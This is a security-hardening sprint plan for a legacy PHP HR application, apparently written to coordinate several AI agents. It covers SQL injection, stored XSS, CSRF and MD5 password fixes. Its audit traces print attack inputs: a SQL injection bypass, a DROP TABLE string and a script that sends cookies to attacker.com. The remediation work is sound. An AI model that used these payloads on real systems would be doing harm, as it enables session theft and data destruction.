# Sprint 05 Dispatch — Security Hardening + Modernization Foundation

> Close 4 critical security vulnerabilities. Establish characterization tests before any code changes. Introduce Composer + PSR-4 as the modernization baseline.
> Stack: PHP 7.4 (target 8.2), MySQL 5.7, Apache, jQuery 2.x, no Composer, no framework, includes-based routing

## Sprint Goals

1. Fix SQL injection in employee search (`$_GET` concatenated into raw `mysql_query()`)
2. Fix stored XSS in employee notes field (no output escaping anywhere in view layer)
3. Fix CSRF on salary update form (no token, no verification)
4. Fix plaintext password storage (MD5 without salt → bcrypt migration with `password_hash()`)
5. Add Composer + PSR-4 autoloading as the modernization entry point
6. Write characterization tests capturing current behavior before any logic is touched

## Execution Traces

### Chain 1: SQL Injection — Employee Search (P1)
```
search.php → $_GET['q'] read directly, no sanitization
→ include 'includes/db.php' → get_employees_by_name($search)
→ mysql_query("SELECT * FROM employees WHERE name LIKE '%" . $search . "%'")
Signal: ' OR '1'='1 in search box returns all employees.
'; DROP TABLE employees;-- is executable. No escaping, no PDO, no prepared statements.
```

### Chain 2: Stored XSS — Employee Notes (P1)
```
notes_form.php → POST note text via jQuery $.ajax
→ save_note.php → $_POST['note'] → no sanitization
→ include 'includes/db.php' → mysql_query("UPDATE employees SET notes='$note' WHERE id=$id")
→ view_employee.php → include 'includes/db.php' → get_employee($id)
→ echo "<div class='notes'>" . $row['notes'] . "</div>"
Signal: <script>document.location='https://attacker.com/?c='+document.cookie</script>
stored as a note executes in every HR manager's browser viewing that employee.
```

### Chain 3: CSRF — Salary Update (P1)
```
salary_form.php → plain <form method="POST" action="update_salary.php">
→ update_salary.php → include 'includes/auth.php' (only checks $_SESSION['user_id'])
→ $new_salary = $_POST['salary'] → mysql_query("UPDATE employees SET salary=$new_salary WHERE id=$id")
Signal: A malicious page on any domain can POST to update_salary.php.
If HR manager is logged in, the salary updates silently. No token. No referer check.
```

### Chain 4: Password Storage — MD5 Without Salt (P1)
```
login.php → $hash = md5($_POST['password'])
→ include 'includes/db.php' → get_user_by_username($_POST['username'])
→ mysql_query("SELECT * FROM users WHERE username='$username'")
→ if ($row['password'] === $hash) { $_SESSION['user_id'] = $row['id']; }
Signal: MD5 is not a password hash. No salt. Full rainbow table coverage.
users.password column contains unsalted MD5 strings. Must migrate to bcrypt
without locking anyone out — column stores both formats during transition.
```

### Chain 5: Composer + PSR-4 Modernization Foundation (P2)
```
Currently: no composer.json, no autoloader, every file starts with 3-6 include statements.
Target: composer.json with "HRApp\\" → "src/" mapping.
→ New classes created in src/ are autoloaded.
→ Old includes/db.php remains in place — not deleted, not modified.
→ New PDO wrapper class: src/Database/Connection.php
→ New prepared statement wrapper: src/Database/Query.php
Signal: This chain does not fix bugs. It builds the floor that Chain 1-4 fixes stand on.
Security fix classes (SqlQueryBuilder, CsrfToken, PasswordHasher) live in src/.
```

### Chain 6: Characterization Tests — All Endpoints (P1 — Wave 2 Gate)
```
No tests exist. Business logic is untested. Some of it is wrong. We do not know which parts.
QA writes tests that assert what the application CURRENTLY does — including wrong behavior.
These tests must pass against the unmodified codebase before any fix branch is created.
They exist to detect regressions introduced by security fixes, not to document correct behavior.

Endpoints to characterize:
→ search.php: query returns expected rows, empty query returns all employees
→ view_employee.php: employee record renders, notes field content appears verbatim (wrong, but documented)
→ save_note.php: note is stored and retrievable
→ salary_form.php: form renders for authenticated user, redirects to login if not authenticated
→ update_salary.php: salary changes are persisted, non-numeric salary values are handled (or not)
→ login.php: valid credentials set session, invalid credentials do not
Signal: No characterization tests = no permission to merge security fixes that touch business logic.
LEAD blocks Wave 2 merge until QA's characterization test suite passes on main.
```

## Agent Territories

```
BACKEND    → search.php, view_employee.php, save_note.php, update_salary.php, login.php
           (page-level logic: apply fixes from src/ classes to existing pages)
FRONTEND    → notes_form.php, salary_form.php, header.php
           (jQuery AJAX calls, CSRF token injection in forms, session cookie flags)
INFRA  → composer.json, apache .htaccess, php.ini directives, session config
           (Composer setup, PSR-4 registration, session security headers)
SERVICES    → src/Database/Connection.php, src/Database/Query.php
           src/Security/CsrfToken.php, src/Security/PasswordHasher.php
           (new classes in src/ namespace — no old files touched)
QA     → tests/ directory (create from scratch)
           tests/CharacterizationTest.php, tests/SecurityRegressionTest.php
           (PHPUnit, no mocking of DB — tests run against test database fixture)
DATA  → includes/db.php (add mysqli prepared statement helpers alongside old functions)
           database/migrations/001_password_column_expand.sql
           (schema migration to widen users.password to 255 chars for bcrypt hashes)
LEAD     → Merge authority, docs, completion reports
```

## Wave Assignments

### Wave 1 — Foundation (run in parallel, no dependencies on each other)

| Agent | Focus | Chains |
|-------|-------|--------|
| QA | Write characterization tests for all 6 endpoints against unmodified codebase. Tests must pass on `main` before Wave 2 begins. | Chain 6 |
| INFRA | Set up Composer, register `HRApp\` PSR-4 namespace, add `require 'vendor/autoload.php'` to `index.php` entry point only. Add session cookie security flags to `php.ini` or `.htaccess` (`HttpOnly`, `Secure`, `SameSite=Strict`). | Chain 5 (infra half) |
| DATA | Add `db_query_prepared($sql, $params)` helper to `includes/db.php` using `mysqli` prepared statements. Do not remove or modify existing functions. Write schema migration to expand `users.password` from `VARCHAR(32)` to `VARCHAR(255)`. | Chain 4 (schema), Chain 1 (helper) |

**Wave 1 gate:** LEAD does not open Wave 2 until QA's characterization tests pass on `main`.

### Wave 2 — Security Classes (depends on Wave 1 merged)

| Agent | Focus | Chains |
|-------|-------|--------|
| SERVICES | Create `src/Database/Query.php` (PDO prepared statement builder), `src/Security/CsrfToken.php` (generate/validate token stored in `$_SESSION`), `src/Security/PasswordHasher.php` (`password_hash()` + `password_verify()` + MD5 fallback detection for migration). No page files touched. | Chain 1, 3, 4 (class layer) |

### Wave 3 — Backend (depends on Wave 2 merged)

| Agent | Focus | Chains |
|-------|-------|--------|
| BACKEND | In `search.php`: replace `get_employees_by_name()` call with `Query::select()` prepared statement. In `view_employee.php`: wrap `$row['notes']` in `htmlspecialchars($row['notes'], ENT_QUOTES, 'UTF-8')`. In `save_note.php`: strip tags, then save. In `update_salary.php`: validate CSRF token via `CsrfToken::verify()` before processing. In `login.php`: after MD5 match succeeds, rehash with `PasswordHasher::hash()` and update DB record (transparent migration). | Chain 1, 2, 3, 4 (page layer) |

### Wave 4 — Frontend (depends on Wave 3 merged)

| Agent | Focus | Chains |
|-------|-------|--------|
| FRONTEND | In `salary_form.php`: inject `<input type="hidden" name="csrf_token" value="<?= CsrfToken::generate() ?>">`. In `notes_form.php`: inject CSRF token in jQuery AJAX payload. Validate that `save_note.php` now strips `<script>` tags before display. Add `<meta http-equiv="Content-Security-Policy">` header to `includes/header.php`. | Chain 2, 3 (frontend layer) |

### Wave 5 — Ship (depends on all prior waves)

| Agent | Focus | Chains |
|-------|-------|--------|
| LEAD | Run full security regression test suite. Verify characterization tests still pass (no behavior regressions). Merge all branches in order. Write sprint summary. | All |

## Merge Order

```
1. DATA → main  (schema migration + prepared statement helper — no behavior change)
2. INFRA → main  (Composer setup + session config — no behavior change)
3. QA    → main  (characterization tests passing on unmodified code)
   --- Wave 1 gate: LEAD verifies tests pass here before continuing ---
4. SERVICES   → main  (security classes in src/ — no page files touched yet)
5. BACKEND   → main  (page-level security fixes using new classes)
6. FRONTEND   → main  (form CSRF tokens + CSP header)
7. LEAD    → main  (completion report, sprint summary)
```

## Characterization Test Requirements (QA)

QA must produce a test file that passes against the *unmodified* codebase on `main`. Tests use PHPUnit with a test database loaded from a fixture (`tests/fixtures/test_db.sql`). No mocking of the database — these are integration-style tests against real queries.

Required test cases:

```
search.php
  - search with term "Smith" returns employees matching that name
  - search with empty string returns all employees
  - search with SQL metacharacter (') does not throw a fatal error (documents current partial-failure behavior)

view_employee.php
  - employee record renders employee name, department, salary
  - notes field content appears exactly as stored (including raw HTML — documents XSS surface)
  - non-existent employee ID renders an error message (or blank — document which)

save_note.php
  - valid POST saves note to database and is retrievable via view_employee.php
  - unauthenticated POST redirects to login.php
  - note containing <script> tag is stored verbatim (documents XSS before fix)

salary_form.php
  - renders for authenticated user with role 'admin' or 'hr'
  - redirects to login.php if session not set
  - form action points to update_salary.php

update_salary.php
  - authenticated POST with valid employee_id and numeric salary updates the salary
  - non-numeric salary value — document current behavior (likely stored as 0 or error)
  - unauthenticated POST redirects to login.php
  - POST from a different origin succeeds (documents missing CSRF protection before fix)

login.php
  - valid username + correct password sets $_SESSION['user_id']
  - valid username + wrong password does not set session
  - username with SQL metacharacter does not crash (documents current behavior)
```

QA writes these tests to document current behavior, not desired behavior. Some assertions will document known-bad behavior. That is correct. The tests must pass before Wave 2 begins and must continue to pass after all waves are merged (except where a security fix intentionally changes a documented-bad behavior — QA updates those assertions after BACKEND merges).

## Success Criteria

- [ ] SQL injection in `search.php` closed — `' OR '1'='1` returns empty result, does not bypass filter
- [ ] Stored XSS closed — `<script>` in notes field is escaped on display, not executed
- [ ] CSRF closed — `update_salary.php` rejects POST without valid session-bound token
- [ ] Password migration active — new logins rehash MD5 passwords to bcrypt transparently; `password_verify()` used for all logins
- [ ] Composer installed — `vendor/autoload.php` present, `HRApp\` namespace resolves
- [ ] `src/Security/CsrfToken.php`, `src/Security/PasswordHasher.php`, `src/Database/Query.php` exist and are unit tested
- [ ] Characterization test suite passes on `main` after all merges (QA updates assertions for intentional behavior changes only)
- [ ] PHP 7.4 → 8.2 compatibility blockers identified and documented (not yet fixed — this sprint establishes the foundation)
- [ ] `mysql_*` compatibility shim still in place — no existing `mysql_*` calls removed (that is a future sprint)
- [ ] Security regression test suite: all 4 vulnerability classes have automated regression tests

## Worktree Setup

```bash
SPRINT="sprint-05"
PROJECT_DIR="$(pwd)"
PARENT_DIR="$(dirname $PROJECT_DIR)"
PROJECT_NAME="$(basename $PROJECT_DIR)"

for agent in backend frontend infra services qa data lead; do
  git branch $SPRINT/$agent main 2>/dev/null || true
  git worktree add "$PARENT_DIR/${PROJECT_NAME}-${agent}" $SPRINT/$agent
done

# PHP dependencies — once INFRA's branch exists, install Composer in each worktree
# for agent in backend frontend infra services qa data; do
#   (cd "$PARENT_DIR/${PROJECT_NAME}-${agent}" && composer install)
# done
```

## Post-Sprint Cleanup

```bash
for agent in backend frontend infra services qa data lead; do
  git worktree remove "$PARENT_DIR/${PROJECT_NAME}-${agent}" 2>/dev/null
  git branch -d $SPRINT/$agent 2>/dev/null
done
```

## Known Landmines

**The `extract()` calls.** `save_note.php` and `update_salary.php` open with `extract($_POST)`. This simulates `register_globals`. BACKEND must not remove these extractions while fixing the security issues — that is a separate refactor and requires its own characterization tests. Fix the injection surface inside the function, leave the `extract()` in place for now. Flag it in the completion report for next sprint.

**The `mysql_*` shim.** `includes/db.php` polyfills `mysql_query()` against `mysqli`. The shim is fragile — it does not support multi-queries, and the `mysql_real_escape_string()` polyfill is incorrect for multi-byte character sets. Do not trust it for escaping. Use prepared statements via `db_query_prepared()` instead. The shim stays until every caller is migrated.

**The `$_SESSION['role']` check.** `update_salary.php` checks `$_SESSION['role'] === 'admin'`. That role string is set at login and never revalidated. There is no RBAC layer. BACKEND should not add role validation logic — that is out of scope and untested. The CSRF fix is sufficient for this sprint.

**jQuery 2.1.4.** FRONTEND should not upgrade jQuery. Version 2.x has known security issues but the upgrade requires testing all `.ajax()` calls for API changes. Upgrading jQuery is a separate sprint. FRONTEND adds the CSP header and CSRF token injection using the existing jQuery version.

---

**Sprint Planning Source:** Security audit findings, PHP 8.2 upgrade pre-assessment
